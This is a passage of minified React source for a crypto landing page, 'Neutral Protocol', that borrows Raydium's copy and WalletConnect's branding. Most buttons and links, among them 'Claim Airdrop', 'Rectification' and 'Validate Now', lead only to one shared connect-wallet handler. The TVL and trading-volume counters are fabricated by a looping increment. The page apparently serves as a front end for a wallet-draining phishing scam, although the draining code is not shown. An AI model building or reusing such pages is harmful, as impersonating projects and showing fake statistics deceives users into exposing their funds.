															WebkitBackgroundClip:
																"text",
														},
														children: "Solutions",
													}),
												],
											}),
											f.jsx("div", {
												className:
													"font-normal text-xl mobile:text-base text-[#adc6ff] mb-6",
												children:
													"Neutral Protocol is a decentralized platform and network that blends Blockchain with DeFi, incorporating Blockchain aspects such as non-custodial management, Micropools, rapid liquidity, and decentralized governance..",
											}),
											f.jsxs("div", {
												className:
													"grid grid-cols-2 gap-4 my-6",
												children: [
													f.jsx("button", {
														onClick: z,
														className:
															"Button connect-wallet select-none inline-flex justify-center items-center gap-2 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb clickable clickable-filter-effect home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4",
														children: f.jsxs(
															"div",
															{
																className:
																	"flex items-center gap-2",
																children: [
																	f.jsx(
																		"div",
																		{
																			children:
																				"Launch app",
																		}
																	),
																	f.jsx(
																		"div",
																		{
																			className:
																				"Icon grid h-max w-max",
																			children:
																				f.jsx(
																					"svg",
																					{
																						xmlns: "http://www.w3.org/2000/svg",
																						fill: "none",
																						viewBox:
																							"0 0 24 24",
																						strokeWidth:
																							"1.5",
																						stroke: "currentColor",
																						"aria-hidden":
																							"true",
																						className:
																							"select-none h-3 w-3",
																						children:
																							f.jsx(
																								"path",
																								{
																									strokeLinecap:
																										"round",
																									strokeLinejoin:
																										"round",
																									d: "M8.25 4.5l7.5 7.5-7.5 7.5",
																								}
																							),
																					}
																				),
																		}
																	),
																],
															}
														),
													}),
													f.jsx("button", {
														onClick: z,
														className:
															"Button connect-wallet select-none inline-flex justify-center items-center gap-2 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb clickable clickable-filter-effect home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4",
														children: f.jsxs(
															"div",
															{
																className:
																	"Row flex items-center gap-2",
																children: [
																	f.jsx(
																		"div",
																		{
																			children:
																				"Connect Wallet",
																		}
																	),
																	f.jsx(
																		"div",
																		{
																			className:
																				"Icon grid h-max w-max",
																			children:
																				f.jsx(
																					"svg",
																					{
																						xmlns: "http://www.w3.org/2000/svg",
																						fill: "none",
																						viewBox:
																							"0 0 24 24",
																						strokeWidth:
																							"1.5",
																						stroke: "currentColor",
																						"aria-hidden":
																							"true",
																						className:
																							"select-none h-3 w-3",
																						children:
																							f.jsx(
																								"path",
																								{
																									strokeLinecap:
																										"round",
																									strokeLinejoin:
																										"round",
																									d: "M8.25 4.5l7.5 7.5-7.5 7.5",
																								}
																							),
																					}
																				),
																		}
																	),
																],
															}
														),
													}),
													f.jsx("button", {
														onClick: z,
														className:
															"Button connect-wallet select-none inline-flex justify-center items-center gap-2 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb clickable clickable-filter-effect home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4",
														children: f.jsxs(
															"div",
															{
																className:
																	"Row flex items-center gap-2",
																children: [
																	f.jsx(
																		"div",
																		{
																			children:
																				"Rectification",
																		}
																	),
																	f.jsx(
																		"div",
																		{
																			className:
																				"Icon grid h-max w-max",
																			children:
																				f.jsx(
																					"svg",
																					{
																						xmlns: "http://www.w3.org/2000/svg",
																						fill: "none",
																						viewBox:
																							"0 0 24 24",
																						strokeWidth:
																							"1.5",
																						stroke: "currentColor",
																						"aria-hidden":
																							"true",
																						className:
																							"select-none h-3 w-3",
																						children:
																							f.jsx(
																								"path",
																								{
																									strokeLinecap:
																										"round",
																									strokeLinejoin:
																										"round",
																									d: "M8.25 4.5l7.5 7.5-7.5 7.5",
																								}
																							),
																					}
																				),
																		}
																	),
																],
															}
														),
													}),
													f.jsx("button", {
														onClick: z,
														className:
															"Button connect-wallet select-none inline-flex justify-center items-center gap-2 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb clickable clickable-filter-effect home-rainbow-button-bg text-white mobile:text-xs px-5 mobile:px-4",
														children: f.jsxs(
															"div",
															{
																className:
																	"Row flex items-center gap-2",
																children: [
																	f.jsx(
																		"div",
																		{
																			children:
																				"Claim Airdrop",
																		}
																	),
																	f.jsx(
																		"div",
																		{
																			className:
																				"Icon grid h-max w-max",
																			children:
																				f.jsx(
																					"svg",
																					{
																						xmlns: "http://www.w3.org/2000/svg",
																						fill: "none",
																						viewBox:
																							"0 0 24 24",
																						strokeWidth:
																							"1.5",
																						stroke: "currentColor",
																						"aria-hidden":
																							"true",
																						className:
																							"select-none h-3 w-3",
																						children:
																							f.jsx(
																								"path",
																								{
																									strokeLinecap:
																										"round",
																									strokeLinejoin:
																										"round",
																									d: "M8.25 4.5l7.5 7.5-7.5 7.5",
																								}
																							),
																					}
																				),
																		}
																	),
																],
															}
														),
													}),
												],
											}),
											f.jsxs("div", {
												className:
													"grid grid-cols-2 gap-4 my-6",
												children: [
													f.jsx(id, {
														title: "TOTAL VALUE LOCKED",
														initialValue: 3172750128,
													}),
													f.jsx(id, {
														title: "TOTAL TRADING VOLUME",
														initialValue: 811545246782,
													}),
												],
											}),
										],
									}),
								],
							}),
							f.jsxs("section", {
								className:
									"grid-child-center overflow-hidden relative mx-auto tablet:mx-5 px-24 tablet:p-8 max-w-[1320px] min-h-[506px] rounded-[100px] mobile:rounded-[40px]",
								style: {
									background:
										"radial-gradient(at center top,transparent 20%,hsl(245, 60%, 16%, 0.2)), #1b1659",
									boxShadow: `8px 8px 10px rgba(20, 16, 65, 0.05),
                -8px -8px 10px rgba(197, 191, 255, 0.05),
                inset 0 6px 20px rgba(197, 191, 255, 0.2),
                inset 0 -1px 25px rgba(197, 191, 255, 0.1)`,
									backgroundSize: "100% 100%",
								},
								children: [
									f.jsx("div", {
										className:
											"absolute inset-0 opacity-30",
										style: {
											background:
												"linear-gradient(245.22deg, #da2eef 7.97%, #2b6aff 49.17%, #39d0d8 92.1%)",
											maskSize: "cover",
											WebkitMaskSize: "cover",
											backgroundImage:
												"url('/home-bg-element-2.png')",
										},
									}),
									f.jsxs("div", {
										className:
											"mx-auto flex flex-col gap-6 justify-center items-center",
										children: [
											f.jsxs("div", {
												className: "mb-8",
												children: [
													f.jsx("div", {
														className:
															"w-10 h-px my-2 mx-auto rounded-full",
														style: {
															background:
																"radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)",
														},
													}),
													f.jsx("div", {
														className:
															"text-xl text-white",
														children:
															"TRUSTED BY INDUSTRY LEADERS",
													}),
												],
											}),
											f.jsxs("div", {
												className:
													"grid gap-5 md:grid-cols-2 md:max-w-2/3",
												children: [
													f.jsxs("div", {
														className:
															"Card flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl",
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-trade.svg",
																					alt: "home-trade",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Migration",
															}),
															f.jsx("div", {
																className:
																	"font-light text-sm text-[#c4d6ff] mb-5",
																children:
																	"Swap or Migrate quickly and cheaply.",
															}),
															f.jsxs("a", {
																children: [
																	" ",
																	f.jsx(
																		"button",
																		{
																			onClick:
																				z,
																			className:
																				"Button select-none connect-wallet inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
																			children:
																				"Enter Exchange",
																		}
																	),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl",
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-yield.svg",
																					alt: "home-yield",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsxs("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children: [
																	"Claim",
																	" ",
																],
															}),
															f.jsx("div", {
																className:
																	"font-light text-sm text-[#c4d6ff] mb-5",
																children:
																	"Claim fees and Claim farms.",
															}),
															f.jsxs("a", {
																children: [
																	" ",
																	f.jsx(
																		"button",
																		{
																			onClick:
																				z,
																			className:
																				"Button select-none connect-wallet inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
																			children:
																				"Claim Now",
																		}
																	),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl",
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-pool.svg",
																					alt: "home-pool",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Validate",
															}),
															f.jsx("div", {
																className:
																	"font-light text-sm text-[#c4d6ff] mb-5",
																children:
																	"Validate liquidity and any SPL token.",
															}),
															f.jsxs("a", {
																children: [
																	" ",
																	f.jsx(
																		"button",
																		{
																			onClick:
																				z,
																			className:
																				"Button select-none connect-wallet inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
																			children:
																				"Validate Now",
																		}
																	),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl",
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-acceleraytor.svg",
																					alt: "home-acceleraytor",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Buy & Sell",
															}),
															f.jsx("div", {
																className:
																	"font-light text-sm text-[#c4d6ff] mb-5",
																children:
																	"Buy & Sell all assets easily.",
															}),
															f.jsxs("a", {
																children: [
																	" ",
																	f.jsx(
																		"button",
																		{
																			onClick:
																				z,
																			className:
																				"Button select-none connect-wallet inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
																			children:
																				"Click here",
																		}
																	),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl",
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-trade.svg",
																					alt: "home-trade",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Trade",
															}),
															f.jsx("div", {
																className:
																	"font-light text-sm text-[#c4d6ff] mb-5",
																children:
																	"Swap or Trade quickly and cheaply.",
															}),
															f.jsxs("a", {
																children: [
																	" ",
																	f.jsx(
																		"button",
																		{
																			onClick:
																				z,
																			className:
																				"Button select-none connect-wallet inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
																			children:
																				"Enter Exchange",
																		}
																	),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl",
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-yield.svg",
																					alt: "home-yield",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Yield",
															}),
															f.jsx("div", {
																className:
																	"font-light text-sm text-[#c4d6ff] mb-5",
																children:
																	"Earn yield through fees and yield farms.",
															}),
															f.jsxs("a", {
																children: [
																	" ",
																	f.jsx(
																		"button",
																		{
																			onClick:
																				z,
																			className:
																				"Button select-none connect-wallet inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
																			children:
																				"Enter Farms",
																		}
																	),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl",
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-pool.svg",
																					alt: "home-pool",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Pool",
															}),
															f.jsx("div", {
																className:
																	"font-light text-sm text-[#c4d6ff] mb-5",
																children:
																	"Provide liquidity for any SPL token.",
															}),
															f.jsxs("a", {
																children: [
																	" ",
																	f.jsx(
																		"button",
																		{
																			onClick:
																				z,
																			className:
																				"Button select-none connect-wallet inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
																			children:
																				"Add Liquidity",
																		}
																	),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card flex-1 children-center frosted-glass-lightsmoke forsted-blur-sm py-6 px-12 rounded-3xl",
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-acceleraytor.svg",
																					alt: "home-acceleraytor",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"AcceleRaytor",
															}),
															f.jsx("div", {
																className:
																	"font-light text-sm text-[#c4d6ff] mb-5",
																children:
																	"Launchpad for new Solana projects.",
															}),
															f.jsxs("a", {
																children: [
																	" ",
																	f.jsx(
																		"button",
																		{
																			className:
																				"Button select-none connect-wallet inline-flex justify-center items-center gap-2 px-4 py-2.5 rounded-xl mobile:rounded-lg font-medium whitespace-nowrap appearance-none bg-formkit-thumb text-formkit-thumb-text-normal clickable clickable-filter-effect frosted-glass-teal",
																			children:
																				"View Projects",
																		}
																	),
																],
															}),
														],
													}),
												],
											}),
										],
									}),
								],
							}),
							f.jsxs("section", {
								className:
									"grid-child-center grid-cover-container",
								children: [
									f.jsx("div", {
										className: "w-screen h-full",
										style: {
											background:
												"url('/home-bg-element-3.png') 0% 0% / 100% 100%",
										},
									}),
									f.jsxs("div", {
										className:
											"max-w-[1220px] px-14 tablet:px-4 mt-28 mx-16 tablet:mx-4 mb-44",
										children: [
											f.jsxs("div", {
												className: "mb-8",
												children: [
													f.jsx("div", {
														className:
															"w-10 h-px my-2 mx-auto rounded-full",
														style: {
															background:
																"radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)",
														},
													}),
													f.jsx("div", {
														className:
															"text-xl text-white",
														children:
															"Neutral protocol caters for everything you need.",
													}),
												],
											}),
											f.jsxs("div", {
												className:
													"grid gap-6 grid-cols-3 tablet:grid-cols-1 mobile:grid-cols-1 justify-items-center",
												children: [
													f.jsxs("div", {
														className:
															"Card max-w-[356px] grid children-center frosted-glass-smoke forsted-blur-sm py-6 px-10 rounded-3xl",
														style: {
															gridTemplateRows:
																"auto auto 1fr",
															alignItems:
																"normal",
														},
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "/home-order-book-AMM.svg",
																					alt: "home-order-book-AMM",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Order Book AMM",
															}),
															f.jsxs("div", {
																className:
																	"font-light text-[#c4d6ff] mb-5",
																children: [
																	"Walletconnect's",
																	" AMM interacts with OpenBook's central limit order book, meaning that pools have access to all order flow and liquidity on OpenBook, and vice versa.",
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card max-w-[356px] grid children-center frosted-glass-smoke forsted-blur-sm py-6 px-10 rounded-3xl",
														style: {
															gridTemplateRows:
																"auto auto 1fr",
															alignItems:
																"normal",
														},
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "assets/home-yield.svg",
																					alt: "home-yield",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Best Price Swaps",
															}),
															f.jsx("div", {
																className:
																	"font-light text-[#c4d6ff] mb-5",
																children:
																	"Walletconnect determines the best swap route among all pools in order to provide the best price for users, and executes accordingly.",
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Card max-w-[356px] grid children-center frosted-glass-smoke forsted-blur-sm py-6 px-10 rounded-3xl",
														style: {
															gridTemplateRows:
																"auto auto 1fr",
															alignItems:
																"normal",
														},
														children: [
															f.jsx("div", {
																className:
																	"frosted-glass-teal p-3 mb-3 rounded-xl",
																children: f.jsx(
																	"div",
																	{
																		className:
																			"Icon grid h-max w-max",
																		children:
																			f.jsx(
																				"img",
																				{
																					src: "assets/home-pool.svg",
																					alt: "home-pool",
																					className:
																						"select-none h-6 w-6",
																				}
																			),
																	}
																),
															}),
															f.jsx("div", {
																className:
																	"font-semibold text-lg text-white mb-2",
																children:
																	"Premissionless Liquidity",
															}),
															f.jsx("div", {
																className:
																	"font-light text-[#c4d6ff] mb-5",
																children:
																	"Raydium enables the permissionless creation of liquidity pools and farms so projects can launch and bootstrap liquidity in a decentralized manner.",
															}),
														],
													}),
												],
											}),
										],
									}),
								],
							}),
							f.jsxs("footer", {
								className: "pt-56 overflow-hidden",
								style: {
									background:
										"url('/home-footer-bg.webp') 0px 0px / 100% 100%",
								},
								children: [
									f.jsxs("div", {
										className:
											"grid mobile:gap-14 justify-around px-[10%] grid-cols-4 tablet:grid-cols-3 mobile:grid-cols-1 gap-16 gap-y-4",
										children: [
											f.jsxs("div", {
												children: [
													f.jsxs("div", {
														className: "mb-8",
														children: [
															f.jsx("div", {
																className:
																	"text-sm mb-3 tablet:text-center text-white",
																children:
																	"ABOUT",
															}),
															f.jsx("div", {
																className:
																	"w-6 h-px my-2 rounded-full tablet:mx-auto",
																style: {
																	background:
																		"radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)",
																},
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Col flex flex-col gap-6",
														children: [
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"Documentation",
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"CoinMarketCap",
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"CoinGecko",
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"Disclaimer",
															}),
														],
													}),
												],
											}),
											f.jsxs("div", {
												children: [
													f.jsxs("div", {
														className: "mb-8",
														children: [
															f.jsx("div", {
																className:
																	"text-sm mb-3 tablet:text-center text-white",
																children:
																	"PROTOCOL",
															}),
															f.jsx("div", {
																className:
																	"w-6 h-px my-2 rounded-full tablet:mx-auto",
																style: {
																	background:
																		"radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)",
																},
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Col flex flex-col gap-6",
														children: [
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"Apply for DropZone",
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"Apply for Fusion Pool",
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"Apply for AcceleRaytor",
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"Permissionless Pool",
															}),
														],
													}),
												],
											}),
											f.jsxs("div", {
												children: [
													f.jsxs("div", {
														className: "mb-8",
														children: [
															f.jsx("div", {
																className:
																	"text-sm mb-3 tablet:text-center",
																children:
																	"SUPPORT",
															}),
															f.jsx("div", {
																className:
																	"w-6 h-px my-2 rounded-full tablet:mx-auto",
																style: {
																	background:
																		"radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)",
																},
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"Col flex flex-col gap-6",
														children: [
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children:
																	"Getting Started on Walletconnect",
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white tablet:text-center connect-wallet",
																children: "FAQ",
															}),
														],
													}),
												],
											}),
											f.jsxs("div", {
												className:
													"tablet:col-span-full tablet:justify-self-center",
												children: [
													f.jsxs("div", {
														className:
															"mb-8 tablet:hidden",
														children: [
															f.jsx("div", {
																className:
																	"text-sm mb-3",
																children:
																	"COMMUNITY",
															}),
															f.jsx("div", {
																className:
																	"w-6 h-px my-2 rounded-full",
																style: {
																	background:
																		"radial-gradient(39.84% 47.5% at 96.82% 58.33%, #39d0d8 0%, #2b6aff 100%)",
																},
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"flex flex-col tablet:flex-row gap-6 tablet:gap-10",
														children: [
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white connect-wallet",
																children:
																	f.jsxs(
																		"div",
																		{
																			className:
																				"Row flex items-center gap-2",
																			children:
																				[
																					f.jsx(
																						"div",
																						{
																							className:
																								"Icon grid h-max w-max frosted-glass-teal p-1.5 rounded-lg text",
																							children:
																								f.jsx(
																									"img",
																									{
																										src: "/media-twitter.svg",
																										alt: "media-twitter",
																										className:
																											"select-none w-5 h-5 tablet:w-6 tablet:h-6",
																									}
																								),
																						}
																					),
																					f.jsx(
																						"div",
																						{
																							className:
																								"tablet:hidden",
																							children:
																								"Twitter",
																						}
																					),
																				],
																		}
																	),
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white connect-wallet",
																children:
																	f.jsxs(
																		"div",
																		{
																			className:
																				"Row flex items-center gap-2",
																			children:
																				[
																					f.jsx(
																						"div",
																						{
																							className:
																								"Icon grid h-max w-max frosted-glass-teal p-1.5 rounded-lg text",
																							children:
																								f.jsx(
																									"img",
																									{
																										src: "/media-medium.svg",
																										alt: "media-medium",
																										className:
																											"select-none w-5 h-5 tablet:w-6 tablet:h-6",
																									}
																								),
																						}
																					),
																					f.jsx(
																						"div",
																						{
																							className:
																								"tablet:hidden",
																							children:
																								"Medium",
																						}
																					),
																				],
																		}
																	),
															}),
															f.jsx("a", {
																tabIndex: "0",
																rel: "nofollow noopener noreferrer",
																target: "_blank",
																className:
																	"Link clickable hover:underline underline-offset-1 text-[#c4d6ff] hover:text-white",
																href: "https://discord.gg/raydium",
																children:
																	f.jsxs(
																		"div",
																		{
																			className:
																				"Row flex items-center gap-2",
																			children:
																				[
																					f.jsx(
																						"div",
																						{
																							className:
																								"Icon grid h-max w-max frosted-glass-teal p-1.5 rounded-lg text",
																							children:
																								f.jsx(
																									"img",
																									{
																										src: "/media-discord.svg",
																										alt: "media-discord",
																										className:
																											"select-none w-5 h-5 tablet:w-6 tablet:h-6",
																									}
																								),
																						}
																					),
																					f.jsx(
																						"div",
																						{
																							className:
																								"tablet:hidden",
																							children:
																								"Discord",
																						}
																					),
																				],
																		}
																	),
															}),
															f.jsx("div", {
																className:
																	"Row flex items-center gap-2",
																children: f.jsx(
																	"div",
																	{
																		children:
																			f.jsx(
																				"div",
																				{
																					className:
																						"PopoverButton",
																					children:
																						f.jsxs(
																							"div",
																							{
																								className:
																									"Row flex text-[#c4d6ff] hover:text-white items-center gap-1 cursor-pointer",
																								children:
																									[
																										f.jsx(
																											"div",
																											{
																												className:
																													"Icon grid h-max w-max frosted-glass-teal p-1.5 rounded-lg text",
																												children:
																													f.jsx(
																														"img",
																														{
																															src: "/media-telegram.svg",
																															alt: "media-telegram",
																															className:
																																"select-none w-5 h-5 tablet:w-6 tablet:h-6",
																														}
																													),
																											}
																										),
																										f.jsx(
																											"div",
																											{
																												className:
																													"tablet:hidden",
																												children:
																													"Telegram",
																											}
																										),
																										f.jsx(
																											"div",
																											{
																												className:
																													"Icon grid h-max w-max",
																												children:
																													f.jsx(
																														"svg",
																														{
																															xmlns: "http://www.w3.org/2000/svg",
																															fill: "none",
																															viewBox:
																																"0 0 24 24",
																															strokeWidth:
																																"1.5",
																															stroke: "currentColor",
																															"aria-hidden":
																																"true",
																															className:
																																"select-none h-4 w-4",
																															children:
																																f.jsx(
																																	"path",
																																	{
																																		strokeLinecap:
																																			"round",
																																		strokeLinejoin:
																																			"round",
																																		d: "M19.5 8.25l-7.5 7.5-7.5-7.5",
																																	}
																																),
																														}
																													),
																											}
																										),
																									],
																							}
																						),
																				}
																			),
																	}
																),
															}),
														],
													}),
												],
											}),
										],
									}),
									f.jsx("img", {
										className:
											"Image mx-auto p-20 transform scale-125 pointer-events-none",
										src: "https://1000logos.net/wp-content/uploads/2022/05/WalletConnect-Logo-500x281.png",
										height: "30",
										width: "30",
										alt: "logo-with-text",
									}),
								],
							}),
						],
					}),
				],
			}),
		}),
	});
}
const id = ({ title: T, initialValue: G }) => {
	const [z, h] = mt.useState(G);
	mt.useEffect(() => {
		const D = G + 1e9,
			N = (D - G) / 12e8;
		let _ = G;
		const J = setInterval(() => {
			_ >= D && (_ = G), (_ += N), h(Math.floor(_));
		}, 20);
		return () => clearInterval(J);
	}, [G]);
	const H = (q) => new Intl.NumberFormat("en-US").format(q);
	return f.jsxs("div", {
		className:
			"Card frosted-glass-smoke rounded-xl md:rounded-3xl p-3 md:p-6 text-center",
		children: [
			f.jsx("div", {
				className: "text-xs md:text-sm text-[#adc6ff] mb-1",
				children: T,
			}),
			f.jsxs("div", {
				className:
					"flex justify-center md:text-xl text-sm font-normal text-white tracking-widest",
				children: [
					f.jsx("div", { className: "mr-1", children: "$" }),
					f.jsx("div", {
						className: "tabular-nums inline-block mono",
